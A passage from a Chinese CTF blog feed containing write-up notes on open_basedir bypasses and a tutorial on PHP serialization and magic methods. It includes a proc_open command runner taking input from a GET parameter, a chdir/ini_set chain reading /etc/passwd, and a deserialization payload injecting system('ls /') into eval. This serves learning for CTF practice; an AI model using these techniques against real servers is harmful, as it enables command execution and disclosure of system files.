<h1 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="Misc-签到"></a>Misc-签到</h1><p>题目有提示，是ascii码值<br>我们将给的数字转为16进制在用网上现成的工具即可得到下面的结果<br><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/5.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>常见姿势</title>
    <url>/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="web805-open-basedir"><a href="#web805-open-basedir" class="headerlink" title="web805_open_basedir"></a>web805_open_basedir</h1><p>这题考察的是如何绕过open_basedir。open_basedir是php的一个闲着目录的ini设置，但是这个还是比较好逃逸的<br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/1.png" class="" title="alt text"><br>首先我们可以发现其无法使用常见的文件读取函数来读取open_basedir外的文件。<br>但是我们有如下几种方式来绕过</p>
<h2 id="1-open-basedir对命令执行并没有限制"><a href="#1-open-basedir对命令执行并没有限制" class="headerlink" title="1.open_basedir对命令执行并没有限制"></a>1.open_basedir对命令执行并没有限制</h2><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/2.png" class="" title="alt text">
<p>我们可以先尝试绕过disable_functions。我尝试使用蚁剑的插件来进行绕过但是我不知道为什么蚁无法连接上这个。所以我只好手动绕过<br>首先我发现其没有过滤proc_open这个函数，那么我们直接使用这个函数来命令执行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$descriptorspec</span>=<span class="keyword">array</span>( </span><br><span class="line">       <span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>,<span class="string">&#x27;r&#x27;</span>), </span><br><span class="line">       <span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),</span><br><span class="line">       <span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">   );</span><br><span class="line">   <span class="variable">$handle</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$command</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>,<span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$handle</span>))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;proc_open failed&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">     <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">     <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">   <span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure><br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/3.png" class="" title="alt text"></p>
<h2 id="2-使用glob-目录读取-利用chdir-与ini-set-组合Bypass"><a href="#2-使用glob-目录读取-利用chdir-与ini-set-组合Bypass" class="headerlink" title="2.使用glob://+目录读取+利用chdir()与ini_set()组合Bypass"></a>2.使用glob://+目录读取+利用chdir()与ini_set()组合Bypass</h2><p>glob://是一个封装协议其不会受到open_basedir的影响。<br>我们可以使用文件读取的原生类或者函数+glob://来读取各目录的文件<br>如下<br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/4.png" class="" title="alt text"><br>也可以使用scandir<br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/5.png" class="" title="alt text"><br>这些读取方法可以使用<code>glob:///*/www/../*</code>这种方法来读取var等目录<br>当我们读取到flag的名字和位置后可以使用chdir和ini_set来绕过<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;LSE&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;LSE&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure><br>给个文章<a href="https://www.cnblogs.com/hookjoy/p/12846164.html">open_basedir bypass</a></p>
<h1 id="web806-无参RCE"><a href="#web806-无参RCE" class="headerlink" title="web806 无参RCE"></a>web806 无参RCE</h1><p>方法如下文章<br><a href="https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">无参RCE</a></p>
<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>刷题</tag>
        <tag>多语言</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化与反序列化</title>
    <url>/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="我会在这里写下我学习序列化和反序列化的过程"><a href="#我会在这里写下我学习序列化和反序列化的过程" class="headerlink" title="我会在这里写下我学习序列化和反序列化的过程"></a>我会在这里写下我学习序列化和反序列化的过程</h1><h1 id="类与对像"><a href="#类与对像" class="headerlink" title="类与对像"></a>类与对像</h1><p>学习序列化和反序列化最基本的就是对类和对象的了解</p>
<h2 id="什么是类什么是对象"><a href="#什么是类什么是对象" class="headerlink" title="什么是类什么是对象"></a>什么是类什么是对象</h2><p>类就是就是对象的抽象，而对象就是对类的实例化</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>类相当于一个写着电脑配置的清单而对象就是这太电脑组装后的样子，也就是说对象是类的实体也就是实例</p>
<h1 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h1><h2 id="类的定义包含对类名的定义对成员变量（属性）的定义对成员函数的定义（方法）以下为代码演示"><a href="#类的定义包含对类名的定义对成员变量（属性）的定义对成员函数的定义（方法）以下为代码演示" class="headerlink" title="类的定义包含对类名的定义对成员变量（属性）的定义对成员函数的定义（方法）以下为代码演示"></a>类的定义包含对类名的定义对成员变量（属性）的定义对成员函数的定义（方法）以下为代码演示</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>=<span class="string">&quot;benben&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name2</span>=<span class="string">&quot;dazhuang&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xuanze</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;输出&quot;</span>；</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>();</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$p</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$p</span>-&gt;name;</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">xuanze</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上代码中function以前的为成员属性而function为成员函数（方法）<strong>而<code>$this-&gt;name</code>的意思为调用name</strong> <strong>而<code>$p=new text</code>是对text这个类的实例化，但是在实例化的过程是并不会将成员方法实例化的</strong><br>以上代码结果如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">text <span class="title function_ invoke__">Object</span></span><br><span class="line">(</span><br><span class="line">    [name] =&gt; benben</span><br><span class="line">    [name2] =&gt; dazhuang</span><br><span class="line">)<span class="comment">//print_r($p)输出的实例$p</span></span><br><span class="line"></span><br><span class="line">benben<span class="comment">//由echo $p-&gt;naem</span></span><br><span class="line">输出<span class="comment">//由成员函数输出的内容</span></span><br></pre></td></tr></table></figure></p>
<h2 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h2><p>php访问的修饰符有三种<code>public</code> <code>protected</code> <code>private</code><br>public是公开的<br>是外部和子类都可用的<br>而private是私有的外部不可用但是子类可用<br>protected是受保护的子类与外部都不可使用<br>具体代码如下<br>子类就是类型的成员来自父类的类型代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class hero&#123;</span><br><span class="line">  public  $name=&#x27;chengyaojin&#x27;;</span><br><span class="line">  private  $sex=&#x27;man&#x27;;</span><br><span class="line">  protected  $shengao=&#x27;165&#x27;;</span><br><span class="line">  function jineng($var1) &#123;</span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">    echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class hero2 extends hero&#123;</span><br><span class="line">    function test()&#123;</span><br><span class="line">    echo $this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo $this-&gt;sex.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    echo $this-&gt;shengao.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cyj= new hero();</span><br><span class="line">$cyj2=new hero2();</span><br><span class="line">echo $cyj-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $cyj2-&gt;test();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>其中hero2就是hero的子类类型以外就是外部</p>
<h1 id="序列化serialize"><a href="#序列化serialize" class="headerlink" title="序列化serialize"></a>序列化serialize</h1><p>序列化就是将对象变成一字符串<br>如下代码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class text&#123;</span><br><span class="line">    var $name=&quot;benben&quot;;  </span><br><span class="line">    var $name2=&quot;dazhuang&quot;;</span><br><span class="line"></span><br><span class="line">    function xuanze()&#123;</span><br><span class="line">        $this-&gt;name;</span><br><span class="line">        echo &quot;输出&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $p=new text();</span><br><span class="line">    print_r($p);</span><br><span class="line">    serialize($p);</span><br><span class="line">   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>输出如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text Object</span><br><span class="line">(</span><br><span class="line">    [name] =&gt; benben</span><br><span class="line">    [name2] =&gt; dazhuang</span><br><span class="line">)</span><br><span class="line">O:4:&quot;text&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;benben&quot;;s:5:&quot;name2&quot;;s:8:&quot;dazhuang&quot;;&#125;</span><br></pre></td></tr></table></figure><br>后面的一长串字符串就是序列化的结果下面我会对序列化的每个元素进行讲解<br><code>O</code>代表的是<code>object</code>代表了对象而O:4:”text”:2代表了对象名有<code>4</code>个字符叫<code>text</code>内含有<code>2</code>个成员属性<code>&#123;&#125;</code>内部是成员变量<br><code>s:4:&quot;name&quot;;s:6:&quot;benben&quot;;</code><br><code>s</code>代表字符串，整串代表成员变量名的类型是字符串有<code>4</code>个字符叫<code>name</code>变量的值的类型为字符串有<code>6</code>个字符叫<code>benben</code></p>
<h2 id="数组的序列化"><a href="#数组的序列化" class="headerlink" title="数组的序列化"></a>数组的序列化</h2><p>基本所有类型的变量都可以进行序列化数组也一样<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = array(&#x27;benben&#x27;,&#x27;dazhuang&#x27;,&#x27;laoliu&#x27;);</span><br><span class="line">echo $a[0];</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>输出为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benbena:3:&#123;i:0;s:6:&quot;benben&quot;;i:1;s:8:&quot;dazhuang&quot;;i:2;s:6:&quot;laoliu&quot;;&#125;</span><br></pre></td></tr></table></figure><br>其中<code>a</code>为数组名<code>a:3</code>代表数组内有<code>3</code>个数据，<code>i:1</code>代表下标类型为<code>int</code>，下标为<code>1</code>所以<code>i:0;s:6:&quot;benben&quot;</code>的意思为下标为0的数据为字符型有6个字符叫benben</p>
<h2 id="权限修饰符序列化后的格式"><a href="#权限修饰符序列化后的格式" class="headerlink" title="权限修饰符序列化后的格式"></a>权限修饰符序列化后的格式</h2><h3 id="私有的private"><a href="#私有的private" class="headerlink" title="私有的private"></a>私有的private</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class test&#123;</span><br><span class="line">    private $pub=&#x27;benben&#x27;;</span><br><span class="line">    function jineng()&#123;</span><br><span class="line">        echo $this-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;text&quot;:1：&#123;s:9:&quot;textpub&quot;;s:6:&quot;benben&quot;&#125;</span><br></pre></td></tr></table></figure><br>这个输出我们可以发现他的变量名加了一个text并且字符串长度明显比显示出来的长两个，这是因为textpub的两边其实还有两个看不见的空字符</p>
<h3 id="受保护的protected"><a href="#受保护的protected" class="headerlink" title="受保护的protected"></a>受保护的protected</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class test&#123;</span><br><span class="line">    protected $pub=&#x27;benben&#x27;;</span><br><span class="line">    function jineng()&#123;</span><br><span class="line">        echo $this-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:6:&quot;*pub&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure><br>也一样多了个*并且比显示的字符串多了两个字符原因同上</p>
<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    public  $a = &#x27;benben&#x27;;</span><br><span class="line">    protected  $b = 666;</span><br><span class="line">    private  $c = false;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = new test();</span><br><span class="line">$d = serialize($d);</span><br><span class="line">echo $d.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo urlencode($d).&quot;&lt;br /&gt;&quot;;</span><br><span class="line">$a = urlencode($d);</span><br><span class="line">$b = unserialize(urldecode($a));</span><br><span class="line">var_dump($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;benben&quot;;s:4:&quot;*b&quot;;i:666;s:7:&quot;testc&quot;;b:0;&#125;</span><br><span class="line">O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A666%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7D</span><br><span class="line">object(test)#1 (3) &#123; [&quot;a&quot;]=&gt; string(6) &quot;benben&quot; [&quot;b&quot;:protected]=&gt; int(666) [&quot;c&quot;:&quot;test&quot;:private]=&gt; bool(false) &#125;</span><br></pre></td></tr></table></figure><br>反序列化顾名思义就是序列化逆序<br><strong>反序列化只与传入反序列化的值有关与其类无关</strong>也就是反序列化与类无关只要修改反序列化的参数就可以更改反序列化的值</p>
<h1 id="反序列化的简单例题"><a href="#反序列化的简单例题" class="headerlink" title="反序列化的简单例题"></a>反序列化的简单例题</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$get = $_GET[&quot;benben&quot;];</span><br><span class="line">$b = unserialize($get);</span><br><span class="line">$b-&gt;displayVar() ;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这题我们可以看到其将<code>$get</code>进行反序列化之后调用成员函数<code>displayvar()</code>而<code>displayvar</code>的内容是在<code>eval()</code>函数里调用成员变量<code>a</code><br>那么我们就可以构造一个序列化后的<code>text</code>类型的字符串修改其中<code>$a</code>的值为<code>危险函数</code>再将其传入<code>$get</code>里那么危险函数就会被调用到<code>eval</code>里导致信息泄露<br>传入的get值如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;text&quot;:1:&#123;s:1:&quot;a&quot;;s:15:&quot;system(&quot;ls /&quot;);&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>魔术方法是一个预定义好的，在特定情况下自动触发的行为方法</p>
<h2 id="掌握魔术方法一定要掌握的四个点"><a href="#掌握魔术方法一定要掌握的四个点" class="headerlink" title="掌握魔术方法一定要掌握的四个点"></a>掌握魔术方法一定要掌握的四个点</h2><p><strong>1.触发时机(重要)</strong><br><strong>2.功能</strong><br><strong>3.参数(重要)</strong><br><strong>4.返回值</strong></p>
<h2 id="1-construct-构造函数：在实例化一个对象时，首先会自动执行一个方法（函数）"><a href="#1-construct-构造函数：在实例化一个对象时，首先会自动执行一个方法（函数）" class="headerlink" title="1.__construct()构造函数：在实例化一个对象时，首先会自动执行一个方法（函数）"></a>1.__construct()构造函数：在实例化一个对象时，首先会自动执行一个方法（函数）</h2><p><strong>construct中文名叫构造函数。顾名思义这个函数是在构造对时（也就是实例化时）触发的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">text</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了构造函数一次\r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>=<span class="keyword">new</span> <span class="title function_ invoke__">text</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">触发了构造函数一次</span><br><span class="line">benben</span><br><span class="line">O:4:&quot;text&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;benben&quot;;&#125;</span><br></pre></td></tr></table></figure><br>从以上代码和输出可以看出在实例化触发了</strong>construct执行了<strong>constrct的命令将name赋值为了输入的参数<br>注意：`</strong>construct($name)`括号里的参数名可自由更改</p>
<h2 id="destruct-解析函数，在对象的所有引用被删除或对象显式被销毁时执行。"><a href="#destruct-解析函数，在对象的所有引用被删除或对象显式被销毁时执行。" class="headerlink" title="__destruct()解析函数，在对象的所有引用被删除或对象显式被销毁时执行。"></a>__destruct()解析函数，在对象的所有引用被删除或对象显式被销毁时执行。</h2><p><strong>destruct在实例化和反序列化间接触发<br>原因是在实例化后类会变成对象，代码完全运行结束时(也就是程序结束时)会删除所有代码，就会触发析构函数<br>在反序列时将序列化后的字符串再次变成了对象而后，在程序结束时程序会自动销毁对象导致其触发</strong>destruct()<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次\r\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;6\n&quot;</span>;<span class="comment">//判断是在该代码前触发还是后触发</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;6\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br><span class="line">6  </span><br><span class="line">触发了析构函数1次</span><br><span class="line"> 触发了析构函数1次</span><br></pre></td></tr></table></figure><br>通过输出结果也可以都是在代码完全运行后触发</p>
<h3 id="析构函数的简单例题"><a href="#析构函数的简单例题" class="headerlink" title="析构函数的简单例题"></a>析构函数的简单例题</h3><img src="/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/li1-1.png" class="" title="Alt text">
<h2 id="sleep-序列化的时候触发（先sleep后序列化）"><a href="#sleep-序列化的时候触发（先sleep后序列化）" class="headerlink" title="__sleep()序列化的时候触发（先sleep后序列化）"></a>__sleep()序列化的时候触发（先sleep后序列化）</h2><p>触发时机：在对象序列化之前触发。<br>功能：返回需要被序列化存储的成员变量，删除不必要的变量。<br>参数：参数是成员属性。<br>返回值：需要被序列化存储的成员属性。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到输出的序列化结果中比正常输出要少了password这个成员变量，原因是__sleep函数在序列化之前执行且只返回了username和nickname删除了password所以序列化时password没有序列化</p>
<h2 id="weakup-weakup是在反序列化之前触发，"><a href="#weakup-weakup是在反序列化之前触发，" class="headerlink" title="__weakup() weakup是在反序列化之前触发，"></a>__weakup() weakup是在反序列化之前触发，</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    const SITE = &#x27;uusama&#x27;;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    private $order;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;password = $this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($user_ser))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object(User)#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;</span><br></pre></td></tr></table></figure>
<p>我们查看上面的结果可以发现其输出的值表示其反序列化之后多了一个变量<code>password</code>这就是因为在反序列化时weakup执行添加了一个password并赋值为username的值</p>
<h2 id="tostring-和invoke"><a href="#tostring-和invoke" class="headerlink" title="tostring()和invoke()"></a><strong>tostring()和</strong>invoke()</h2><h3 id="tostring-是错误的将对象当成字符串使用时触发"><a href="#tostring-是错误的将对象当成字符串使用时触发" class="headerlink" title="__tostring()是错误的将对象当成字符串使用时触发"></a>__tostring()是错误的将对象当成字符串使用时触发</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class text&#123;</span><br><span class="line">    public $name=&quot;panpan&quot;;</span><br><span class="line">    function __tostring()</span><br><span class="line">    &#123;</span><br><span class="line">        return &quot;触发&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$p=new text;</span><br><span class="line">echo $p;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">触发</span><br></pre></td></tr></table></figure>
<p>从输出结果我们可以看出当我们使用echo等输出字符串的函数输出对象时会触发函数__tostring。</p>
